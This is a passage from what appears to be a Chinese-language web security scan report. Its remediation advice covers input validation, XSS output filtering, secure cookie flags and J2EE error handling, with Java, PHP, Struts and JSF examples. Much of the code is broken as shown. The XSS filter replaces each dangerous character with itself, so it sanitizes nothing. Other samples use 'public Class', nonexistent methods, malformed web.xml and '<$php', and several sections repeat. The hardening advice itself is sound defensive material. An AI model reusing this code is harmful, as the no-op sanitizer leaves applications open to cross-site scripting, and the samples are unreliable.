          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&lt;");
                  break;
              case '&gt;': 
                  result.append("&gt;");
                  break;
              case '"': 
                  result.append(""");
                  break;
              case '\'': 
                  result.append("'");
                  break;
              case '%': 
                  result.append("%");
                  break;
              case ';': 
                  result.append(";");
                  break;
              case '(': 
                  result.append("(");
                  break;
              case ')': 
                  result.append(")");
                  break;
              case '&amp;': 
                  result.append("&amp;");
                  break;
              case '+':
                  result.append("+");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</div><div></div><div>Java Servlet API 2.3 引進了「過濾器」，它支援截取及轉換 HTTP 要求或回應。</div><div></div><div>利用「Servlet 過濾器」，以 Validator.filter 來消毒回應的範例：</div><div></div><div>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
  
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
  
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
  
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  
  }
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div>當機密資料儲存在 Cookie 中，請務必利用 Cookie.setSecure(boolean flag)，在 HTTP 回應中設定 Cookie 的安全旗標，以指示瀏覽器利用 HTTPS 或 SSL 之類的安全通訊協定來傳送 Cookie。</div><div></div><div>維護 "user" Cookie 安全的範例：</div><div></div><div>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」實作上述所有資料驗證需求，是一個功能強大的架構。這些規則配置在定義表單欄位輸入驗證規則的 XML 檔中。依預設，Struts 支援在利用 Struts 'bean:write' 標籤撰寫的所有資料上，過濾 [8] HTTP 回應中輸出的危險字元。</div><div>設定 'filter=false' 旗標可以停用這個過濾。</div><div></div><div>Struts 定義下列基本輸入驗證器，但也可以定義自訂驗證器：</div><div>required：如果欄位含有空格以外的任何字元，便告成功。</div><div>mask：如果值符合 mask 屬性給定的正規表示式，便告成功。</div><div>range：如果值在 min 和 max 屬性給定的值範圍內（(value &gt;= min) 且 (value &lt;= max)），便告成功。</div><div>maxLength：如果欄位長度小於或等於 max 屬性，便告成功。</div><div>minLength：如果欄位長度大於或等於 min 屬性，便告成功。</div><div>byte、short、integer、long、float、double：如果值可以轉換成對應的基本類型，便告成功。</div><div>date：如果值代表有效日期，便告成功。</div><div>可提供日期型樣。</div><div>creditCard：如果值可能是有效的信用卡號碼，便告成功。</div><div>e-mail：如果值可能是有效的電子郵件位址，便告成功。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件及輸入驗證的 Java API (JSR 127)。JavaServer Faces API 實作下列基本驗證器，但可以定義自訂驗證器：</div><div>validate_doublerange：登錄元件的 DoubleRangeValidator</div><div>validate_length：登錄元件的 LengthValidator</div><div>validate_longrange：登錄元件的 LongRangeValidator</div><div>validate_required：登錄元件的 RequiredValidator</div><div>validate_stringrange：登錄元件的 StringRangeValidator</div><div>validator：登錄元件的自訂 Validator</div><div></div><div>JavaServer Faces API 定義下列 UIInput 和 UIOutput 展現器（標籤）：</div><div>input_date：接受以 java.text.Date 實例格式化的 java.util.Date</div><div>output_date：顯示以 java.text.Date 實例格式化的 java.util.Date</div><div>input_datetime：接受以 java.text.Time 實例格式化的 java.util.Date</div><div>output_datetime：顯示以 java.text.Time 實例格式化的 java.util.Date</div><div>input_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>output_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>input_text：接受單行字串。</div><div>output_text：顯示單行字串。</div><div>input_time：接受以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>output_time：顯示以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>input_hidden：可讓頁面作者將隱藏變數併入頁面</div><div>input_secret：接受不含空格的單行文字，輸入之時，將它顯示成一組星號</div><div>input_textarea：接受多行文字</div><div>output_errors：顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息</div><div>output_label：將巢狀元件顯示為指定輸入欄位的標籤</div><div>output_message：顯示本地化訊息</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div></div><div>** 錯誤處理：</div><div></div><div>許多 J2EE Web 應用程式架構都遵循「模型視圖控制器 (MVC)」型樣。在這個型樣中，Servlet 扮演控制器的角色。Servlet 將應用程式處理程序委派給 JavaBean，例如，EJB Session Bean（模型）。之後，Servlet 再將要求轉遞給 JSP（視圖）來呈現處理結果。Servlet 應該檢查所有輸入、輸出、回覆碼、錯誤碼及已知的異常狀況，以確保會實際進行預期的處理程序。資料驗證可以保護應用程式免於遭受惡意的資料竄改，有效的錯誤處理策略則是防止應用程式意外揭露內部錯誤訊息（例如：異常狀況堆疊追蹤）所不可或缺。好的錯誤處理策略會處理下列項目：</div><div></div><div>[1] 定義錯誤</div><div>[2] 報告錯誤</div><div>[3] 呈現錯誤</div><div>[4] 錯誤對映</div><div></div><div>[1] 定義錯誤</div><div>應該避免將錯誤訊息寫在應用程式層（例如：Servlet）。相反地，應用程式應該使用對映至已知之應用程式失敗的錯誤索引鍵。在實務中，好的做法是定義錯誤索引鍵來對映至 HTML 表單欄位或其他 Bean 內容的驗證規則。比方說，如果需要 "user_name" 欄位，它必須是英數字元，且在資料庫中必須是唯一，便應該定義下列錯誤索引鍵：</div><div></div><div>(a) ERROR_USERNAME_REQUIRED：這個錯誤索引鍵用來顯示一則訊息，通知使用者需要 "user_name" 欄位；</div><div>(b) ERROR_USERNAME_ALPHANUMERIC：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 欄位應該是英數字元；</div><div>(c) ERROR_USERNAME_DUPLICATE：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 值在資料庫中重複；</div><div>(d) ERROR_USERNAME_INVALID：這個錯誤索引鍵用來顯示一則一般訊息，通知使用者 "user_name" 值無效；</div><div></div><div>在實務中，好的做法是定義下列架構 Java 類別來儲存及報告應用程式錯誤：</div><div></div><div>- ErrorKeys：定義所有錯誤索引鍵</div><div></div><div>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</div><div></div><div>- Error：封裝個別錯誤</div><div></div><div>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</div><div></div><div>- Errors：封裝錯誤的集合</div><div></div><div>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
  
          private HashMap errors = new HashMap();
      }
</div><div></div><div>以下是利用上述架構類別來處理 "user_name" 欄位驗證錯誤的範例：</div><div></div><div>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</div><div></div><div>[2] 報告錯誤</div><div>報告 Web 層應用程式錯誤的方式有兩種：</div><div>(a) Servlet 錯誤機制</div><div>(b) JSP 錯誤機制</div><div></div><div>[2-a] Servlet 錯誤機制</div><div>Servlet 報告錯誤的可能方式如下：</div><div>- 轉遞至輸入 JSP（已將錯誤儲存在要求屬性中），或</div><div>- 利用 HTTP 錯誤碼引數來呼叫 response.sendError，或</div><div>- 擲出異常狀況</div><div></div><div>在實務中，好的做法是處理所有已知的應用程式錯誤（依照 [1] 區段所說明），將它們儲存在要求屬性中，再轉遞給輸入 JSP。輸入 JSP 應該顯示錯誤訊息，並提示使用者重新輸入資料。下列範例說明如何轉遞到輸入 JSP (userInput.jsp)：</div><div></div><div>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</div><div></div><div>如果 Servlet 無法轉遞到已知的 JSP 頁面，第二個選項是利用 response.sendError 方法，設定 HttpServletResponse.SC_INTERNAL_SERVER_ERROR 引數（狀態碼 500）來報告錯誤。</div><div>請參閱 javax.servlet.http.HttpServletResponse javadoc，以取得各種 HTTP 狀態碼的詳細資訊。</div><div>傳回 HTTP 錯誤的範例：</div><div>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</div><div></div><div>作為最後的手段，Servlet 可以擲出異常狀況，它必須是下列類別之一的子類別：</div><div>- RuntimeException</div><div>- ServletException</div><div>- IOException</div><div></div><div>[2-b] JSP 錯誤機制 JSP 頁面依照下列範例所示來定義 errorPage 指引，從而提供了執行時期異常狀況的處理機制：</div><div></div><div>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</div><div></div><div>未捕捉的 JSP 異常狀況是轉遞到指定的 errorPage，而原始異常狀況則設在稱為 javax.servlet.jsp.jspException 的要求參數中。錯誤頁面必須包含 isErrorPage 指引，如下所示：</div><div></div><div>      &lt;%@ page isErrorPage="true" %&gt;
</div><div></div><div>isErrorPage 指引會使 "exception" 變數起始設定為所擲出的異常狀況物件。</div><div></div><div>[3] 呈現錯誤</div><div>J2SE Internationalization API 提供用來提出應用程式資源以及將訊息格式化的公用程式類別，其中包括：</div><div></div><div>(a) 資源組</div><div>(b) 訊息格式化</div><div></div><div>[3-a] 資源組</div><div>資源組會將本地化的資料與使用它的原始碼分開，從而支援國際化。每個資源組都會儲存特定語言環境之鍵值配對的對映。</div><div></div><div>通常是利用或延伸 java.util.PropertyResourceBundle，它會將內容儲存在外部內容檔中，如下列範例所示：</div><div></div><div>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  
  ...
</div><div></div><div>定義多重資源可以支援不同的語言環境（因此稱為資源組）。例如，定義 ErrorMessages_fr.properties 可以支援資源組系列的法國成員。如果要求之語言環境的資源成員不存在，便會使用預設成員。</div><div>在上述範例中，預設資源是 ErrorMessages.properties。</div><div>在上述範例中，預設資源是 ErrorMessages.properties。依使用者的語言環境而定，應用程式（JSP 或 Servlet）會從適當的資源擷取內容。</div><div></div><div>[3-b] 訊息格式化</div><div>J2SE 標準類別 java.util.MessageFormat 提供以取代位置保留元來建立訊息的一般方式。MessageFormat 物件包含內嵌了格式指定元的型樣字串，如下所示：</div><div></div><div>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</div><div></div><div>以下是利用 ResourceBundle 和 MessageFormat 來呈現錯誤訊息的更綜合性的範例：</div><div></div><div>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</div><div></div><div>建議您定義自訂 JSP 標籤（如 displayErrors）來疊代處理及呈現錯誤訊息，如上述範例所示。</div><div></div><div>[4] 錯誤對映</div><div>一般而言，「Servlet 儲存器」會傳回對應於回應狀態碼或異常狀況的預設錯誤頁面。您可以利用自訂錯誤頁面來指定狀態碼或異常狀況與 Web 資源之間的對映。</div><div>在實務中，好的做法是開發不揭露內部錯誤狀態的靜態錯誤頁面（依預設，大部分 Servlet 儲存器都會報告內部錯誤訊息）。這項對映是依照下列範例所指定，配置在「Web 部署描述子 (web.xml)」中：</div><div></div><div>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</div><div></div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」是依照上述說明來定義錯誤處理機制的 Java 架構。驗證規則配置在 XML 檔中，檔案定義了表單欄位的輸入驗證規則以及對應的驗證錯誤索引鍵。Struts 提供國際化支援，供您利用資源組和訊息格式化來建置本地化應用程式。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>Struts JSP 標籤庫定義了有條件地顯示一組累計錯誤訊息的 "errors" 標籤，如下列範例所示：</div><div></div><div>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件、驗證輸入，以及支援國際化的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 定義了 "output_errors" UIOutput 展現器，以顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息。</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但一律必須在伺服器層執行資料驗證。用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是實作一或多個驗證各個應用程式參數的函數。下列各節說明一些檢查範例。</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div>如何驗證必要欄位的範例：</div><div></div><div>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</div><div></div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。一律檢查使用者輸入是否符合功能需求所定義的型樣。</div><div>[6] 欄位型樣 一律檢查使用者輸入是否符合功能需求所定義的型樣。 比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：</div><div>^[a-zA-Z0-9]+$</div><div></div><div>[7] Cookie 值</div><div>依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。[8] HTTP 回應</div><div></div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，開發人員應該將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>PHP 包括一些 htmlentities() 之類的自動化消毒公用程式函數：</div><div></div><div>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</div><div></div><div>此外，為了避免「跨網站指令碼」的 UTF-7 變式，您應該明確定義回應的 Content-Type 標頭，例如：</div><div></div><div>  &lt;?php
  
  header('Content-Type: text/html; charset=UTF-8');
  
  ?&gt;
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div></div><div>當機密資料儲存在 Cookie 中，且透過 SSL 來傳輸它時，請務必先在 HTTP 回應中設定 Cookie 的安全旗標。這會指示瀏覽器只透過 SSL 連線來使用這個 Cookie。</div><div></div><div>您可以利用下列程式碼範例來維護 Cookie 安全：</div><div></div><div>  &lt;$php
  
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
  
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
  
</div><div></div><div>此外，我們建議您使用 HttpOnly 旗標。當 HttpOnly 旗標設為 TRUE 時，只能透過 HTTP 通訊協定來存取 Cookie。這表示無法用 JavaScript 之類的 Scripting 語言存取 Cookie。這個設定有助於實際減少透過 XSS 攻擊來盜用身分的情況（不過，並非所有瀏覽器都支援）。PHP 5.2.0 新增 HttpOnly 旗標。</div><div></div><div>參照</div><div></div><div>[1] 利用「HTTP 專用 Cookie」緩和「跨網站指令碼」：</div><a href="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</a><br /><div>[2] PHP 安全聯盟：</div><a href="http://phpsec.org/">http://phpsec.org/</a><br /><div>[3] PHP &amp; Web 應用程式安全部落格 (Chris Shiflett)： </div><a href="http://shiflett.org/">http://shiflett.org/</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/550.html">550</a><br /><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /><a href="http://cwe.mitre.org/data/definitions/209.html">209</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://packetstormsecurity.com/files/10631/rfp2k01.txt.html">如需利用單引號來入侵網站的範例，請參閱 "How I hacked PacketStorm"（作者：Rain Forest Puppy），RFP 的網站</a><br /><a href="http://www.cgisecurity.com/lib/webappdis.doc">"Web Application Disassembly with ODBC Error Messages"（作者：David Litchfield）</a><br /><a href="http://www.cert.org/advisories/CA-1997-25.html">CERT Advisory (CA-1997-25)：消毒 CGI Script 中的使用者提供資料</a><br 